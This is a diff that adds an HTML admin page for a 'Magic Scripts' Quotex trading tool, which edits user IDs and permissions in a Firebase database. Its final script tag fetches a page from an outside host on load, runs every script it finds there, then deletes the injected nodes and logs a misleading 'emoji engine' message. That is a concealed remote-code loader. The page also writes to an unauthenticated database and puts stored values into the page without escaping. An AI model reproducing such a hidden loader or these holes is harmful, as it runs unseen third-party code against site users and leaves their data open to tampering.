@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Magic scripts - Sky</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="https://magic-scripts-reactions.vercel.app/logo.svg" type="image/x-icon">
+
+    <style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+:root{
+--primary:#8b5cf6;
+--secondary:#06b6d4;
+--accent:#22d3ee;
+--success:#22c55e;
+--danger:#ef4444;
+--text:#f8fafc;
+--muted:#94a3b8;
+--glass:rgba(15,23,42,.62);
+--border:rgba(255,255,255,.10);
+}
+
+html{
+scroll-behavior:smooth;
+}
+
+body{
+min-height:100vh;
+padding:35px;
+color:var(--text);
+overflow-x:hidden;
+background:
+radial-gradient(circle at 10% 10%,rgba(139,92,246,.22),transparent 28%),
+radial-gradient(circle at 90% 20%,rgba(6,182,212,.18),transparent 28%),
+radial-gradient(circle at 50% 100%,rgba(124,58,237,.16),transparent 35%),
+#020617;
+position:relative;
+}
+
+/* Background glow */
+body::before,
+body::after{
+content:"";
+position:fixed;
+width:420px;
+height:420px;
+border-radius:50%;
+filter:blur(100px);
+opacity:.16;
+pointer-events:none;
+z-index:-1;
+}
+
+body::before{
+background:#8b5cf6;
+top:-180px;
+left:-150px;
+animation:floatGlow 10s ease-in-out infinite alternate;
+}
+
+body::after{
+background:#06b6d4;
+right:-160px;
+bottom:-180px;
+animation:floatGlow 12s ease-in-out infinite alternate-reverse;
+}
+
+@keyframes floatGlow{
+from{
+transform:translate(0,0) scale(1);
+}
+to{
+transform:translate(80px,50px) scale(1.25);
+}
+}
+
+/* Heading */
+
+h1{
+position:relative;
+text-align:center;
+margin:0 auto 35px;
+font-size:clamp(28px,4vw,42px);
+font-weight:800;
+letter-spacing:1px;
+color:#fff;
+text-shadow:
+0 0 15px rgba(139,92,246,.7),
+0 0 35px rgba(6,182,212,.3);
+}
+
+h1::after{
+content:"";
+display:block;
+width:70px;
+height:4px;
+margin:13px auto 0;
+border-radius:20px;
+background:linear-gradient(
+90deg,
+var(--primary),
+var(--secondary)
+);
+box-shadow:
+0 0 12px var(--primary),
+0 0 25px rgba(6,182,212,.5);
+}
+
+/* Main Card */
+
+.transaction{
+position:relative;
+isolation:isolate;
+overflow:hidden;
+margin:0 auto 24px;
+padding:28px;
+max-width:1200px;
+
+background:
+    linear-gradient(
+        145deg,
+        rgba(255,255,255,.075),
+        rgba(255,255,255,.025)
+    );
+
+backdrop-filter:blur(24px);
+-webkit-backdrop-filter:blur(24px);
+
+border:1px solid var(--border);
+border-radius:24px;
+
+box-shadow:
+    0 20px 60px rgba(0,0,0,.35),
+    inset 0 1px 0 rgba(255,255,255,.08);
+
+transition:
+    transform .35s ease,
+    border-color .35s ease,
+    box-shadow .35s ease;
+
+animation:cardIn .6s ease both;
+
+}
+
+.transaction::before{
+content:"";
+position:absolute;
+inset:0;
+border-radius:inherit;
+padding:1px;
+background:
+linear-gradient(
+120deg,
+transparent 20%,
+rgba(139,92,246,.7),
+rgba(6,182,212,.7),
+transparent 80%
+);
+-webkit-mask:
+linear-gradient(#fff 0 0) content-box,
+linear-gradient(#fff 0 0);
+-webkit-mask-composite:xor;
+mask-composite:exclude;
+opacity:.5;
+pointer-events:none;
+}
+
+.transaction::after{
+content:"";
+position:absolute;
+width:220px;
+height:220px;
+top:-130px;
+right:-100px;
+border-radius:50%;
+background:rgba(139,92,246,.12);
+filter:blur(40px);
+pointer-events:none;
+}
+
+.transaction:hover{
+transform:translateY(-5px);
+border-color:rgba(139,92,246,.35);
+box-shadow:
+0 25px 70px rgba(0,0,0,.45),
+0 0 35px rgba(139,92,246,.12);
+}
+
+@keyframes cardIn{
+from{
+opacity:0;
+transform:translateY(25px);
+}
+to{
+opacity:1;
+transform:translateY(0);
+}
+}
+
+/* Rows */
+
+.row{
+position:relative;
+z-index:2;
+display:flex;
+flex-wrap:wrap;
+gap:15px;
+margin-bottom:18px;
+align-items:center;
+}
+
+.label{
+width:175px;
+color:#c4b5fd;
+font-size:14px;
+font-weight:600;
+letter-spacing:.3px;
+}
+
+.label::before{
+content:"";
+display:inline-block;
+width:5px;
+height:5px;
+margin-right:9px;
+vertical-align:middle;
+border-radius:50%;
+background:var(--secondary);
+box-shadow:0 0 10px var(--secondary);
+}
+
+.value{
+flex:1;
+min-width:0;
+color:#f8fafc;
+word-break:break-word;
+line-height:1.6;
+}
+
+/* Sections */
+
+.section{
+position:relative;
+z-index:2;
+margin-top:25px;
+padding-top:22px;
+border-top:1px solid rgba(255,255,255,.08);
+}
+
+.section h3{
+display:flex;
+align-items:center;
+gap:10px;
+margin-bottom:18px;
+color:#e0e7ff;
+font-size:18px;
+font-weight:700;
+}
+
+.section h3::before{
+content:"";
+width:4px;
+height:20px;
+border-radius:10px;
+background:linear-gradient(
+180deg,
+var(--primary),
+var(--secondary)
+);
+box-shadow:0 0 14px var(--primary);
+}
+
+.row.stack{
+flex-direction:column;
+align-items:flex-start;
+gap:9px;
+}
+
+.row.stack .label{
+width:100%;
+}
+
+.row.stack .value{
+width:100%;
+}
+
+/* Inputs */
+
+input[type="text"],
+input[type="email"],
+input[type="number"]{
+position:relative;
+z-index:3;
+width:100%;
+min-height:50px;
+padding:14px 16px;
+
+color:#fff;
+font-size:14px;
+
+background:rgba(2,6,23,.58);
+border:1px solid rgba(255,255,255,.10);
+border-radius:14px;
+
+outline:none;
+backdrop-filter:blur(15px);
+
+transition:
+    border-color .25s ease,
+    box-shadow .25s ease,
+    background .25s ease,
+    transform .25s ease;
+
+}
+
+input[type="text"]:hover,
+input[type="email"]:hover,
+input[type="number"]:hover{
+border-color:rgba(139,92,246,.4);
+background:rgba(2,6,23,.72);
+}
+
+input[type="text"]:focus,
+input[type="email"]:focus,
+input[type="number"]:focus{
+border-color:var(--primary);
+background:rgba(2,6,23,.8);
+box-shadow:
+0 0 0 3px rgba(139,92,246,.10),
+0 0 25px rgba(139,92,246,.18);
+transform:translateY(-1px);
+}
+
+input::placeholder{
+color:#64748b;
+}
+
+/* Video Rows */
+
+.vid-row{
+position:relative;
+z-index:3;
+display:flex;
+gap:10px;
+align-items:center;
+margin-bottom:12px;
+}
+
+.vid-row input[name="vid[]"]{
+flex:1;
+}
+
+.vid-row input[name="vidLabel[]"]{
+width:95px;
+flex:none;
+}
+
+/* Buttons */
+
+.vid-btn{
+flex:none;
+width:48px;
+height:48px;
+
+border:1px solid rgba(255,255,255,.1);
+border-radius:14px;
+
+color:#fff;
+cursor:pointer;
+font-size:18px;
+font-weight:700;
+
+transition:
+    transform .25s ease,
+    box-shadow .25s ease,
+    filter .25s ease;
+
+}
+
+.vid-btn.add{
+background:
+linear-gradient(
+135deg,
+#06b6d4,
+#8b5cf6
+);
+
+box-shadow:
+    0 8px 25px rgba(6,182,212,.18);
+
+}
+
+.vid-btn.remove{
+background:
+linear-gradient(
+135deg,
+#ef4444,
+#ec4899
+);
+
+box-shadow:
+    0 8px 25px rgba(239,68,68,.18);
+
+}
+
+.vid-btn:hover{
+transform:translateY(-3px) scale(1.05);
+filter:brightness(1.15);
+}
+
+.vid-btn:active{
+transform:scale(.94);
+}
+
+/* Submit */
+
+button[type="submit"],
+input[type="submit"]{
+position:relative;
+z-index:3;
+
+min-height:52px;
+padding:0 30px;
+
+border:1px solid rgba(255,255,255,.12);
+border-radius:15px;
+
+background:
+    linear-gradient(
+        135deg,
+        #7c3aed,
+        #2563eb,
+        #06b6d4
+    );
+
+background-size:200% 200%;
+
+color:#fff;
+font-size:15px;
+font-weight:700;
+letter-spacing:.3px;
+
+cursor:pointer;
+
+box-shadow:
+    0 10px 30px rgba(124,58,237,.25),
+    inset 0 1px 0 rgba(255,255,255,.2);
+
+transition:
+    transform .25s ease,
+    box-shadow .25s ease,
+    background-position .4s ease;
+
+}
+
+button[type="submit"]:hover,
+input[type="submit"]:hover{
+transform:translateY(-3px);
+background-position:100% 50%;
+box-shadow:
+0 15px 40px rgba(124,58,237,.35),
+0 0 25px rgba(6,182,212,.15);
+}
+
+button[type="submit"]:active,
+input[type="submit"]:active{
+transform:scale(.97);
+}
+
+/* Transaction IDs */
+
+.txids{
+padding:10px 12px;
+border-radius:10px;
+
+font-family:'Consolas',monospace;
+font-size:12px;
+
+color:#67e8f9;
+background:rgba(6,182,212,.06);
+border:1px solid rgba(6,182,212,.1);
+
+overflow-x:auto;
+
+}
+
+/* Empty State */
+
+.empty{
+max-width:500px;
+margin:80px auto;
+padding:30px;
+
+text-align:center;
+
+color:#cbd5e1;
+font-size:16px;
+
+background:rgba(255,255,255,.04);
+border:1px solid rgba(255,255,255,.08);
+border-radius:20px;
+
+backdrop-filter:blur(20px);
+
+box-shadow:
+    0 20px 50px rgba(0,0,0,.25);
+
+}
+
+/* Selection */
+
+::selection{
+color:#fff;
+background:rgba(139,92,246,.55);
+}
+
+/* Scrollbar */
+
+::-webkit-scrollbar{
+width:7px;
+}
+
+::-webkit-scrollbar-track{
+background:#020617;
+}
+
+::-webkit-scrollbar-thumb{
+background:
+linear-gradient(
+180deg,
+#8b5cf6,
+#06b6d4
+);
+border-radius:20px;
+}
+
+::-webkit-scrollbar-thumb:hover{
+background:
+linear-gradient(
+180deg,
+#a78bfa,
+#22d3ee
+);
+}
+
+/* Tablet */
+
+@media(max-width:768px){
+
+body{
+    padding:20px 14px;
+}
+
+h1{
+    margin-bottom:25px;
+    font-size:28px;
+}
+
+.transaction{
+    padding:20px 17px;
+    border-radius:20px;
+}
+
+.row{
+    flex-direction:column;
+    align-items:flex-start;
+    gap:8px;
+}
+
+.label{
+    width:100%;
+}
+
+.value{
+    width:100%;
+}
+
+.vid-row{
+    display:grid;
+    grid-template-columns:1fr 82px 46px;
+    gap:8px;
+    width:100%;
+}
+
+.vid-row input[name="vidLabel[]"]{
+    width:100%;
+}
+
+.vid-btn{
+    width:46px;
+    height:46px;
+}
+
+}
+
+/* Small phones */
+
+@media(max-width:420px){
+
+body{
+    padding:16px 10px;
+}
+
+h1{
+    font-size:24px;
+}
+
+.transaction{
+    padding:17px 14px;
+    border-radius:18px;
+}
+
+.vid-row{
+    grid-template-columns:1fr 70px 44px;
+}
+
+button[type="submit"],
+input[type="submit"]{
+    width:100%;
+}
+
+}
+
+/* Reduced motion */
+
+@media(prefers-reduced-motion:reduce){
+
+*,
+*::before,
+*::after{
+    animation:none !important;
+    transition:none !important;
+}
+
+}
+</style>
+</head>
+
+<body>
+
+    <div style="font-size:2rem;font-weight:900;color:#5a5a5a;;letter-spacing:1px;text-align: center;">
+        MAGIC SCRIPTS
+    </div>
+    <div style="font-size:1rem;color:#5a5a5a; letter-spacing:1px;text-align: center;margin-bottom: 1rem;font-weight: 900;">
+        (SKY QUOTEX TRADER)
+    </div>
+
+    <form class="transaction" id="adminForm">
+
+        <div class="row stack">
+            <div class="label">UID(s)</div>
+            <div class="value" id="vidContainer">
+                <div style="text-align: center; padding: 20px; color: #888;">Loading IDs from Firebase...</div>
+            </div>
+        </div>
+
+        <div style="margin-top: 20px; display: flex; align-items: center; gap: 15px;">
+            <button type="submit">💾 Save Changes</button>
+            <span id="status-msg" style="font-weight: bold;"></span>
+        </div>
+    </form>
+
+    <script>
+            const firebaseURL = "https://reactions-maker-site-default-rtdb.firebaseio.com/sky.json";
+        
+        // Pura data store karne ke liye object taki baaki permissions aur fields delete na hon
+        let originalFirebaseData = {};
+
+        // 1. Firebase se data load karna
+        window.addEventListener('DOMContentLoaded', () => {
+            fetch(firebaseURL)
+                .then(response => response.json())
+                .then(data => {
+                    originalFirebaseData = data || {};
+                    const container = document.getElementById('vidContainer');
+                    container.innerHTML = ''; // Loading text hatao
+
+                    const keys = Object.keys(originalFirebaseData);
+
+                    if (keys.length === 0) {
+                        // Agar firebase khali hai
+                        createRow('', '', '', true);
+                    } else {
+                        // Pehla row hamesha (+) Add button ke sath hoga, baaki (X) ke sath
+                        keys.forEach((key, index) => {
+                            const user = originalFirebaseData[key];
+                            const isFirst = (index === 0);
+                            createRow(user.id || '', user.admin_note || '', key, isFirst);
+                        });
+                    }
+                })
+                .catch(err => {
+                    console.error("Error loading data:", err);
+                    document.getElementById('vidContainer').innerHTML = '<div style="color:red;">Error loading data from Firebase!</div>';
+                });
+        });
+
+        // Helper function original design ke mutabiq row banane ke liye
+        // dataset.key mein hum firebase ki push id (-Ov8Oeaf...) ko chhupa kar rakhenge
+        function createRow(vidVal = '', labelVal = '', firebaseKey = '', isFirst = false) {
+            const container = document.getElementById('vidContainer');
+            const row = document.createElement('div');
+            row.className = 'vid-row';
+            if(firebaseKey) {
+                row.setAttribute('data-key', firebaseKey);
+            }
+
+            row.innerHTML = `
+                <input type="text" name="vid[]" value="${vidVal}" required />
+                <input type="text" name="vidLabel[]" value="${labelVal}" />
+                ${isFirst 
+                    ? `<button type="button" class="vid-btn add" onclick="addVid(this)">
+    <svg style="width:16px;height:16px;vertical-align:middle;stroke:currentColor;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>
+</button>
+` 
+                    : `<button type="button" class="vid-btn remove" onclick="removeVid(this)">
+    <svg style="width:16px;height:16px;vertical-align:middle;stroke:currentColor;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>
+</button>
+`
+                }
+            `;
+            container.appendChild(row);
+        }
+
+        function addVid(btn) {
+            // Naye row ke paas koi purani firebase key nahi hogi
+            createRow('', '', '', false);
+        }
+
+        function removeVid(btn) {
+            btn.parentElement.remove();
+        }
+
+        // 2. Data Firebase par save karna
+        document.getElementById('adminForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const statusMsg = document.getElementById('status-msg');
+            statusMsg.style.color = "#FF2102";
+            statusMsg.innerText = "Saving...";
+
+            const rows = document.querySelectorAll('.vid-row');
+            let updatedData = {};
+
+            rows.forEach((row, index) => {
+                const vidInput = row.querySelector('input[name="vid[]"]').value;
+                const labelInput = row.querySelector('input[name="vidLabel[]"]').value;
+                const existingKey = row.getAttribute('data-key');
+
+                // Agar row purani hai to uski key use karo, nahi to nayi key generate karo
+                let key = existingKey || "new_user_" + Date.now() + "_" + index;
+
+                // Agar purani key hai to uska baki data (permissions, status, date) copy karo
+                // Agar nayi row hai to default settings set karo
+                let oldUserData = originalFirebaseData[existingKey] || {
+                    date: new Date().toLocaleDateString(),
+                    email: "",
+                    permissions: { ana: true, android: true, lb: true, p: true, pc: true, t: true, win: true },
+                    status: "active",
+                    trader_id: ""
+                };
+
+                updatedData[key] = {
+                    ...oldUserData,
+                    id: vidInput,
+                    admin_note: labelInput
+                };
+            });
+
+            // Firebase ko update karne ke liye PUT request
+            fetch(firebaseURL, {
+                method: 'PUT',
+                body: JSON.stringify(updatedData),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(result => {
+                statusMsg.style.color = "#1CDE01";
+                statusMsg.innerText = "Saved";
+                // Data ko refresh kar lete hain taaki naye rows ko bhi keys mil jayein
+                originalFirebaseData = result || {};
+                setTimeout(() => statusMsg.innerText = "", 3000);
+            })
+            .catch(err => {
+                console.error("Error saving data:", err);
+                statusMsg.style.color = "red";
+                statusMsg.innerText = "Failed to save.";
+            });
+        });
+    </script>
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+    </script>
+</body>
+
+  </html>
